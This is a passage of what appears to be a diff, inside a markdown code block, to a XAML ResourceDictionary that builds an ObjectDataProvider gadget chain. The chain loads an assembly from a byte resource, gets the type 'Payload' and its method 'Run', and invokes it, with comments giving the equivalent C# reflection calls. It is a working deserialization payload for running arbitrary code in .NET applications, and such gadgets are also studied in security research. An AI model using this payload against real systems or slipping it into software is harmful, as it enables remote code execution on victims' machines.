-        <ObjectDataProvider.MethodParameters>
-            <x:Null></x:Null>
-            <x:Array Type="{x:Type s:Object}"></x:Array>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- Assembly assembly = Assembly.Load(buf); -->
+  <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
+    <ObjectDataProvider.MethodParameters>
+      <StaticResource ResourceKey="buf"></StaticResource>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
+  
+  <!-- Type type = assembly.GetType("MyType"); -->
+  <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
+    <ObjectDataProvider.MethodParameters>
+      <s:String>Payload</s:String>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
+  
+  <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
+  <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
+    <ObjectDataProvider.MethodParameters>
+      <s:String>Run</s:String>
+      <r:BindingFlags>24</r:BindingFlags>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
+  
+  <!-- method.Invoke(null, new object[] {}); -->
+  <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
+    <ObjectDataProvider.MethodParameters>
+      <x:Null></x:Null>
+      <x:Array Type="{x:Type s:Object}"></x:Array>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
 </ResourceDictionary>
 ```
 
